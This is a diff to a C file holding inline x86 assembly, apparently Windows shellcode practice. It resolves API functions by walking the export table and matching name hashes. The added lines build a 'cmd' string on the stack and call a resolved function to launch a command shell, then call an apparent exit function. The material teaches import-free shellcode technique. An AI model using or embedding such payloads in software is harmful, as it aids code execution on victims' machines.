@@ -296,7 +296,7 @@ int main()
 		//DOS to NT
 		mov eax, [ebx + 0x3c];
 		add eax, ebx;
-		
+
 		//NT to Export Table
 		mov eax, [eax + 120];
 		add eax, ebx;
@@ -331,7 +331,7 @@ int main()
 		mov ebx, [ebp - 16];
 
 		//NPT rva to va
-		
+
 		add ebx, [ebp - 24];
 
 		xor edi, edi;
@@ -339,7 +339,7 @@ int main()
 	_GetFunctionName:;
 		mov edx, [ebx];
 		add edx, [ebp - 24];
-		
+
 		xor esi, esi;
 
 	_GetNameHash:;
@@ -366,13 +366,13 @@ int main()
 		mov eax, 2;
 		mul edi;
 		//eax holds mul operation result		
-		
+
 		mov ebx, [ebp - 20];
 		add ebx, eax;
 		add ebx, [ebp - 24];
-		
+
 		movsx ecx, word ptr[ebx];
-	
+
 		mov eax, 4;
 		mul ecx;
 
@@ -386,18 +386,35 @@ int main()
 		mov edi, [edi];
 		add edi, [ebp - 24];
 
-		_GetProcAddressRet:;
+	_GetProcAddressRet:;
 
 		ret;
 
 	SHELLCODE_MAIN:;
 		//edi holds function address
 
+		//cmd null-terminate string
+		xor eax, eax;
+		mov[ebp + 0xc], eax;
+		mov[ebp + 0xc], 0x63;
+		mov[ebp + 0xd], 0x6d;
+		mov[ebp + 0xe], 0x64;
+
 		mov eax, 0x2b3;
 		call _GetProcAddress;
-		
+
+		lea ecx, [ebp + 0xc];
+
+		xor eax, eax;
+		push eax;
+		push ecx;
+		call edi;
+
 		mov eax, 0x479;
 		call _GetProcAddress;
+
+		push 1;
+		call edi;
 
 		add esp, 64;
 		pop ebp;
